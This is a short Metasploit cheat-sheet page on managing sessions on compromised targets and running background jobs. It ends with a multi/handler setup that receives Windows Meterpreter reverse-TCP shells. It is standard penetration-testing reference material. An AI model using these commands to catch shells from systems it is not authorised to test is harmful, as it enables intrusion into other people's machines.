---
title: Sessions & Jobs
tags: [metasploit, meterpreter, sessions, jobs, post-exploitation]
---

# Sessions & Jobs
> Sessions are active connections to compromised targets. Jobs let you run exploits in the background without blocking the console.

## Sessions

```bash
# List all active sessions
sessions

# Interact with a specific session
sessions -i <id>

# Drop from meterpreter to a system shell
meterpreter> shell
```

!!! tip
    Press `Ctrl+Z` to background a session and return to msfconsole without killing it. Use `sessions -i <id>` to return to it.

---

## Jobs

Jobs let you run an exploit or handler in the background — useful for running `multi/handler` while continuing other work.

```bash
# View jobs help
jobs -h

# Run the current exploit as a background job
exploit -j

# List running jobs
jobs -l
```

### Common Use Case — Background Listener
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 4444
exploit -j      # runs handler in background, doesn't block console
jobs -l         # confirm it's running
```
